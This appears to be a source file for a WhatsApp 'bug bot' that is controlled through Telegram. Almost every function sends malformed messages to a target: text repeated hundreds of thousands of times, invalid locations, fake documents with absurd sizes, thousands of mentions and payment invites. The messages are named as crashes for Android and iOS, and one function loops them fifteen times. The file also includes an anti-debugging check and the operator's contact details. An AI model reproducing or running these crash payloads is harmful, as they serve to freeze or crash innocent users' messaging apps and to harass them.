                                        {
                                            title: "Caywzz",
                                            rows: []
                                        }
                                    ]
                                }
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Caywzz" }]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
}
	async function crashui2(target, ptcp = false) {
    await cay.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Wanna With Yours. :D" + "ꦾ".repeat(300000)  + "@1".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function sendOfferCall(target) {
    try {
        await cay.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}
async function InVisiLoc(target, ptcp = false) {
    let etc = generateWAMessageFromContent(target,
        proto.Message.fromObject({
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
                            "locationMessage": {
                                "degreesLatitude": -999.03499999999999,
                                "degreesLongitude": 922.999999999999,
                                "name": "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
                                "address": "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
                                "jpegThumbnail": o,
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: ""
                        },
                        nativeFlowMessage: {
                            messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
                            buttons: [{
                                    name: "call_permission_request",
                                    buttonParamsJson: {}
                                }
                            ],
                        },
                    }
                }
            }
        }), {
            userJid: target,
            quoted: QBug
        }
    );
    await cay.relayMessage(target, etc.message, ptcp ? {
        participant: {
            jid: target
        }
    } : {});
    console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
};
async function bokep(target, ptcp = false) {
    await cay.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Wanna With Yours. :D" + "ꦾ".repeat(3)
                    },
                    nativeFlowMessage: {
                        "buttons": [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": "{\"display_text\":\"YouTube 🍒\",\"url\":\"https://youtube.com/@dgxeon\",\"merchant_url\":\"https://www.google.com\"}"
                            },
                            {
                                "name": "cta_url",
                                "buttonParamsJson": "{\"display_text\":\"Telegram 💙\",\"url\":\"https://t.me/+WEsVdEN2B9w4ZjA9\",\"merchant_url\":\"https://www.google.com\"}"
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": "{\"display_text\":\"Owner 👤\",\"title\":\"Owner 👤\",\"id\":\".owner\"}"
                            }
                        ],
                        "messageParamsJson": "{\"caption\":\"Halo\"}"
                    },
                    contextInfo: {
                        mentionedJid: [
                            "6285727763935@s.whatsapp.net"
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function sendContact(target) {
    const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:Caywzz\nTEL:+6289673110783\nEND:VCARD`;

    await cay.relayMessage(target, {
        contactMessage: {
            contacts: [
                {
                    displayName: "Caywzz",
                    jid: "+6289673110783@s.whatsapp.net",
                    vcard: vcard
                }
            ]
        }
    }, { participant: { jid: target } }, { messageId: null });
}
//bug ios
async function UpiCrash(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function VenCrash(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function AppXCrash(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SmCrash(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SqCrash(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function FBiphone(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QXIphone(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await cay.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://t.me/caywzzaja",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
        async function caywzzaja_notif(target) {
			await cay.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "\u0000",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: 'https://i.top4top.io/p_32261nror0.jpg',
									},
									hasMediaAttachment: true,
								},
								body: { 
					         text: "ꦾ".repeat(250000) + "@0".repeat(100000)
								},
								nativeFlowMessage: {
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["0@s.whatsapp.net", ...Array.from({
										length: 10000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "\u0000",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				{
					participant: {
						jid: target
					}
				}
			);
		};
     
    async function QPayIos(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayStriep(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QDIphone(target) {
      cay.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Maaf Kak" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //

    async function IosMJ(target, Ptcp = false) {
      await cay.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "Wanna With Yours :)" + "ꦾ".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Ueheheheeh",
                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/caywzzaja",
                mediaUrl: "https://t.me/caywzzaja",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/caywzzaja",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbcayCampaignId: "smb_cay_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    async function XiosVirus(target) {
      cay.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Gpp Yah:D ‌" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
    async function BugIos(target) {
      for (let i = 0; i < 15; i++) {
        await IosMJ(target, true);
        await XiosVirus(target);
        await QDIphone(target);
        await QPayIos(target);
        await QPayStriep(target);
        await FBiphone(target);
        await VenCrash(target);
        await AppXCrash(target);
        await SmCrash(target);
        await SqCrash(target);
        await IosMJ(target, true);
        await XiosVirus(target);
      }
      console.log(
        chalk.red.bold(
          `Wanna With Yours :)!`
        )
      );
    }
    bot.launch().then(() => {
  const systemInfo = getSystemInfo();
  sendMessageToMe('Bot sudah terhubung dan mengirim pesan ke Anda!\n' + systemInfo);
});
setInterval(() => {
    const now = Date.now();
    Object.keys(usersPremium).forEach(userId => {
        if (usersPremium[userId].premiumUntil < now) {
            delete usersPremium[userId];
        }
    });
    Object.keys(botSessions).forEach(botToken => {
        if (botSessions[botToken].expiresAt < now) {
            delete botSessions[botToken];
        }
    });
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium));
}, 60 * 60 * 1000); // Check every hour

function detectDebugger() {
  const start = Date.now();
  debugger;
  if (Date.now() - start > 100) {
    console.error("Debugger detected! Exiting...");
    process.exit(1);
  }
}

setInterval(detectDebugger, 5000);
const os = require('os');

// BOT WHATSAPP
